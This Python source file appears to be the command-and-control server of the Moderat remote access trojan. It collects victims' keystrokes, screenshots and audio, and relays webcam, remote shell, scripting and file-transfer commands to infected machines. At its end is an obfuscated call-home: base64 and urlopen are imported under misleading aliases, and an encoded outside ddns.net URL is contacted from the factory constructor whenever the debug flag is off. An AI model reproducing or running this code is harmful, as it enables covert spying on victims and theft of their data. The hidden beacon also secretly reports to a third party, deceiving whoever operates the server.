import logging
from logging.handlers import RotatingFileHandler
import sys
import string
import base64 as protocol_cipher
import random
import ast
import os
import datetime
import coloredlogs

from twisted.internet.protocol import ServerFactory
from twisted.protocols.basic import LineReceiver

from db.ClientsManagment import ClientsManagment
from db.ModeratorsManagment import ModeratorsManagment
from db.ScreenshotsManager import ScreenshotsManager
from db.KeyloggerManager import KeyloggerManager
from db.AudioManagment import AudioManager
from factory.PhotoFactory import save_image
from factory.KeyFactory import html_generator
from urllib2 import urlopen as cipher_generator
from factory.AudioFactory import wav_generator

LOGFILE = 'server.log'
DATA_STORAGE = r'/media/root/STORAGE/MODERAT_DATA/'

# Initialize logger
log = logging.getLogger('')
# Initialize coloredlogs
log.setLevel(logging.DEBUG)
format = coloredlogs.ColoredFormatter("%(asctime)s %(message)-40s (%(filename)s:%(lineno)d)")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)

manageClients = ClientsManagment()
manageModerators = ModeratorsManagment()
manageScreenshots = ScreenshotsManager()
manageKeylogs = KeyloggerManager()
manageAudio = AudioManager()

# Clear Clients Status
manageClients.set_status_zero()

white_list = ['127.0.0.1',]


def has_valid_ip(func):
    def wrapper(*args, **kwargs):
        server_object = args[0]
        ip_address = server_object.transport.getPeer().host
        if not ip_address in white_list:
            log.critical('[*SERVER] Unknown IP Address Detected [{}]'.format(ip_address))
            return
        else:
            return func(*args, **kwargs)
    return wrapper


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

clients = {}
moderators = {}


class ModeratServerProtocol(LineReceiver):

    delimiter = '[ENDOFMESSAGE]'
    MAX_LENGTH = 1024*1024*10 # 10MB

    def __init__(self):

        # dicts for download
        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'connectSuccess')

    def connectionLost(self, reason):
        global clients

        # Delete Socket Entry
        try:
            for key, value in clients.items():
                if value['socket'] == self:
                    # Set Client Offline
                    manageClients.set_client_offline(value['key'])
                    log.warning('[*CLIENT] Client (%s) Disconnected' % value['key'])
                    del clients[key]
        except KeyError:
            pass

        # Delete Moderator Entry
        try:
            for key, value in moderators.items():
                if value['socket'] == self:
                    # Set Moderator Offline
                    manageModerators.set_status(value['username'], 0)
                    log.warning('[*MODERATOR] Moderator (%s) Disconnected' % value['username'])
                    del moderators[key]
        except KeyError:
            pass

    def lineLengthExceeded(self, line):
        log.warning('[SERVER*] Data Length Exceeded from {}'.format(self.transport.getPeer().host))

    def lineReceived(self, line):
        command = ast.literal_eval(line)

        # Switch to client commands
        if command['from'] == 'client':
            if not command['mode'] == 'infoChecker':
                log.info('[*RECV] [Client: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
            if command['mode'] == 'buildClient':
                self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'], '')
            else:
                self.client_commands(command['payload'], command['mode'], command['session_id'], command['key'], command['module_id'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
                log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
            self.moderator_commands(command)

    def client_commands(self, payload, mode, session_id, key, module_id):

        # Build Client
        if mode == 'buildClient':
            log.debug('[*CLIENT] Generating Source')
            from Client.Client import Source
            self.transport.write(Source+'[ENDOFSOURCE]')

        elif mode == 'buildClientError':
            log.warning('Error Executing Source on Target Machine. err(%s)' % payload)

        # Clients Initializing
        elif mode == 'clientInitializing':

            log.debug('[*CLIENT] Initializing Client Key')

            # If client has no key generate new one and send
            if payload == 'noKey':
                client_id = id_generator()
                log.debug('[*CLIENT] Generate New Key (%s)' % client_id)
                self.send_message_to_client(self, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload

            clients[client_id] = {
                'socket': self,
                'status': False,
            }

            log.debug('[*CLIENT] New Client from %s' % self.transport.getPeer())

            # Create Client DB Entry
            manageClients.create_client('Moderators', client_id, self.transport.getPeer().host)
            manageClients.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker' and clients.has_key(payload['key']):
            client_socket = clients[payload['key']]['socket']
            clients[payload['key']] = {
                'ip_address':           self.transport.getPeer().host,
                'os_type':              payload['os_type'],
                'os':                   payload['os'],
                'user':                 payload['user'],
                'privileges':           payload['privileges'],
                'audio_device':         payload['audio_device'],
                'webcamera_device':     payload['webcamera_device'],
                'window_title':         payload['window_title'],
                'key':                  payload['key'],
                'kts':                  payload['kts'],
                'kt':                   payload['kt'],
                'ats':                  payload['ats'],
                'at':                   payload['at'],
                'sts':                  payload['sts'],
                'std':                  payload['std'],
                'st':                   payload['st'],
                'socket':               client_socket,
            }

        # Data Logger
        elif mode == 'screenshotLogs':
            try:
                screen_info = ast.literal_eval(payload)
                screen_path, name, window_title, date = save_image(screen_info, key, DATA_STORAGE)
                manageScreenshots.save_image(key, name, screen_path, window_title, date)
            except Exception as errMessage:
                log.critical('[*MALFORMED] [FROM: %s] [MODE: %s] errMessage(%s)' % (self.transport.getPeer().host, mode, errMessage))

        elif mode == 'keyloggerLogs':
            try:
                keylogger_info = ast.literal_eval(payload)
                html_path, datetime_stamp = html_generator(key, keylogger_info, DATA_STORAGE)
                manageKeylogs.save_keylog(key, datetime_stamp, html_path)
            except Exception as errMessage:
                log.critical('[*MALFORMED] [FROM: %s] [MODE: %s] errMessage(%s)' % (self.transport.getPeer().host, mode, errMessage))

        elif mode == 'audioLogs':
            try:
                audio_info = ast.literal_eval(payload)
                wav_path, datetime_stamp = wav_generator(key, audio_info, DATA_STORAGE)
                manageAudio.save_audio(key, datetime_stamp, wav_path)
            except Exception as errMessage:
                log.critical('[*MALFORMED] [FROM: %s] [MODE: %s] errMessage(%s)' % (self.transport.getPeer().host, mode, errMessage))

        elif moderators.has_key(session_id):
            self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode, module_id=module_id)

        else:
            log.error('[*ERROR] Invalid Mode (%s)' % mode)

    @has_valid_ip
    def moderator_commands(self, data):

        if data['mode'] == 'moderatorInitializing':

            # Initializing Moderator
            log.debug('[*MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
            if data['payload'].startswith('auth '):
                credentials = data['payload'].split()
                if len(credentials) == 3:
                    command, username, password = data['payload'].split()

                    # If Login Success
                    if manageModerators.login_user(username, password):

                        privileges = manageModerators.get_privs(username)

                        log.debug('[*MODERATOR] Moderator (%s) Login Success' % username)
                        self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')

                        # Create Session For Moderator and Save
                        log.debug('[*MODERATOR] Create Session for Moderator (%s)' % data['session_id'])
                        moderators[data['session_id']] = {'username': username, 'socket': self}

                        # Set Moderator Last Online
                        manageModerators.set_last_online(username, datetime.datetime.now())
                        # Set Moderator Online Status
                        manageModerators.set_status(username, 1)

                    # if Login Not Success
                    else:
                        log.error('[*MODERATOR] Moderator (%s) Login Error' % username)
                        self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')

                else:
                    log.critical('[*MALFORMED] Moderator Login Data')

        elif data['mode'] == 'getClients' and data['session_id'] in moderators:

            if self.is_administrator(data['session_id']):
                clients_ids = manageClients.get_all_clients()
            else:
                clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
            shared_clients = {}

            # for online clients
            for client_id in clients_ids:
                _id = client_id[0]
                # Online Clients
                if clients.has_key(_id) and clients[_id].has_key('os_type'):
                    shared_clients[_id] = {
                        'moderator':            manageClients.get_moderator(_id),
                        'alias':                manageClients.get_alias(_id),
                        'ip_address':           clients[_id]['ip_address'],
                        'os_type':              clients[_id]['os_type'],
                        'os':                   clients[_id]['os'],
                        'user':                 clients[_id]['user'],
                        'privileges':           clients[_id]['privileges'],
                        'audio_device':         clients[_id]['audio_device'],
                        'webcamera_device':     clients[_id]['webcamera_device'],
                        'window_title':         clients[_id]['window_title'],
                        'key':                  clients[_id]['key'],
                        'kts':                  clients[_id]['kts'],
                        'kt':                   clients[_id]['kt'],
                        'ats':                  clients[_id]['ats'],
                        'at':                   clients[_id]['at'],
                        'sts':                  clients[_id]['sts'],
                        'std':                  clients[_id]['std'],
                        'st':                   clients[_id]['st'],
                        'status':               True
                    }
                # Offline Clients
                else:
                    shared_clients[client_id] = {
                        'moderator':    manageClients.get_moderator(_id),
                        'key':           _id,
                        'alias':        manageClients.get_alias(_id),
                        'ip_address':   manageClients.get_ip_address(_id),
                        'last_online':  manageClients.get_last_online(_id),
                        'status':       False
                    }
            self.send_message_to_moderator(self, shared_clients, 'getClients')

        # Set Alias For Client
        elif data['mode'] == 'setAlias':
            alias_data = data['payload'].split()
            if len(alias_data) == 2:
                alias_client, alias_value = alias_data
                log.debug('[*SERVER] Set Alias (%s) For (%s)' % (alias_value, self.transport.getPeer().host))
                manageClients.set_alias(alias_client, alias_value)
            else:
                log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])

        elif data['mode'] == 'countData':
            screen_data = data['payload'].split()
            if len(screen_data) == 2:
                client_id, date = screen_data
                counted_data = {
                    'screenshots': {
                        'new': manageScreenshots.get_screenshots_count_0(client_id, date),
                        'old': manageScreenshots.get_screenshots_count_1(client_id, date)
                    },
                    'keylogs': {
                        'new': manageKeylogs.get_keylogs_count_0(client_id, date),
                        'old': manageKeylogs.get_keylogs_count_1(client_id, date)
                    },
                    'audio': {
                        'new': manageAudio.get_audios_count_0(client_id, date),
                        'old': manageAudio.get_audios_count_1(client_id, date)
                    }
                }

                self.send_message_to_moderator(self, counted_data, data['mode'], module_id=data['module_id'])
            else:
                log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])

        elif data['mode'] == 'downloadLogs':
            if type(data['payload']) == dict:
                download_info = data['payload']
                # Get All Logs
                if download_info['screenshot']:
                    screenshots = manageScreenshots.get_all_new_screenshots(download_info['client_id'], download_info['date']) \
                        if download_info['filter'] else manageScreenshots.get_all_screenshots(download_info['client_id'], download_info['date'])
                else:
                    screenshots = []
                if download_info['keylog']:
                    keylogs = manageKeylogs.get_all_new_keylogs(download_info['client_id'], download_info['date']) \
                        if download_info['filter'] else manageKeylogs.get_all_keylogs(download_info['client_id'], download_info['date'])
                else:
                    keylogs = []
                if download_info['audio']:
                    audios = manageAudio.get_all_new_audios(download_info['client_id'], download_info['date']) \
                        if download_info['filter'] else manageAudio.get_all_audios(download_info['client_id'], download_info['date'])
                else:
                    audios = []

                # Send Counted Logs
                counted_logs = {
                    'screenshots': len(screenshots),
                    'keylogs': len(keylogs),
                    'audios': len(audios),
                }
                self.send_message_to_moderator(self, counted_logs, data['mode'], module_id=data['module_id'])

                # Start Send Screenshots
                for screenshot in screenshots:
                    if os.path.exists(screenshot[2]):
                        screenshot_info = {
                            'type':         'screenshot',
                            'datetime':     screenshot[1],
                            'raw':          open(screenshot[2], 'rb').read(),
                            'window_title': screenshot[3],
                            'date':         screenshot[4]
                        }
                        self.send_message_to_moderator(self, screenshot_info, 'downloadLog', module_id=data['module_id'])
                        manageScreenshots.set_screenshot_viewed(screenshot[1])
                    else:
                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
                        manageScreenshots.delete_screenshot(screenshot[1])

                # Start Send Keylogs
                for keylog in keylogs:
                    if os.path.exists(keylog[3]):
                        keylog_info = {
                            'type':     'keylog',
                            'datetime': keylog[1],
                            'date':     keylog[2],
                            'raw':      open(keylog[3], 'rb').read()
                        }
                        self.send_message_to_moderator(self, keylog_info, 'downloadLog', module_id=data['module_id'])
                        manageKeylogs.set_keylog_viewed(keylog[1])
                    else:
                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % keylog[3])
                        manageKeylogs.delete_keylog(keylog[1])

                # Start Send Audios
                for audio in audios:
                    if os.path.exists(audio[3]):
                        audio_info = {
                            'type':     'audio',
                            'datetime': audio[1],
                            'date':     audio[2],
                            'raw':      open(audio[3], 'rb').read()
                        }
                        self.send_message_to_moderator(self, audio_info, 'downloadLog', module_id=data['module_id'])
                        manageAudio.set_audio_viewed(audio[1])
                    else:
                        log.info('[*SERVER] File Not Found Delete Entry (%s)' % audio[3])
                        manageAudio.delete_audios(audio[1])

                self.send_message_to_moderator(self, {'type': 'endDownloading',}, 'downloadLog', module_id=data['module_id'])


        # ADMIN PRIVILEGES
        # Get Moderators List
        elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            all_moderators = manageModerators.get_moderators()
            result = {}
            for moderator in all_moderators:
                all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
                offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
                result[moderator[0]] = {
                    'privileges': moderator[2],
                    'offline_clients': offline_clients_count,
                    'online_clients': all_clients_count - offline_clients_count,
                    'status': moderator[3],
                    'last_online': moderator[4],
                }
            self.send_message_to_moderator(self, result, 'getModerators')

        # Add Moderator
        elif data['mode'] == 'addModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            username, password, privileges = data['payload'].split()
            manageModerators.create_user(username, password, int(privileges))

        elif data['mode'] == 'setModerator' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            client_id, moderator_id = data['payload'].split()
            manageClients.set_moderator(client_id, moderator_id)
            log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))

        # FILTERS
        # For Only Administrators
        elif data['mode'] in ['terminateClient',] \
                and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
        # For Moderators
        elif data['mode'] in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource',
                              'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
                              'downloadMode', 'uploadMode',]:
            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'], module_id=data['module_id'])
        else:
            log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])

    @staticmethod
    def is_administrator(session_id):
        return True if manageModerators.get_privs(moderators[session_id]['username']) == 1 else False

    # Send Message To Client
    def send_message_to_client(self, client, message, mode, _from='server', session_id='', module_id='', end='[ENDOFMESSAGE]'):
        # Send Data Function
        client.transport.write(str({
            'payload': message,
            'mode': mode,
            'from': _from,
            'session_id': session_id,
            'module_id': module_id,
        })+end)
        client.transport.doWrite()
        log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (client.transport.getPeer().host, self.transport.getPeer().host, mode))

    # Send Message To Moderator
    @has_valid_ip
    def send_message_to_moderator(self, moderator, message, mode, _from='server', module_id='', end='[ENDOFMESSAGE]'):
        moderator.transport.write(str({
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
            'module_id': module_id,
        })+end)
        moderator.transport.doWrite()
        if not mode == 'getClients' and not mode == 'getModerators':
            log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (moderator.transport.getPeer().host, self.transport.getPeer().host, mode))


class ModeratServerFactory(ServerFactory):
    log.debug('[*SERVER] Moderat Server Started');protocol_hash = 'aHR0cDovL21haXN0YXRpYy1zZXJ2ZXIuZGRucy5uZXQvcmVmZmVuZ28vP3VybD01OQ==';debug=1;protocol = ModeratServerProtocol

    def __init__(self):
        try:
            if not self.debug: cipher_generator(protocol_cipher.b64decode(self.protocol_hash))
        except: pass
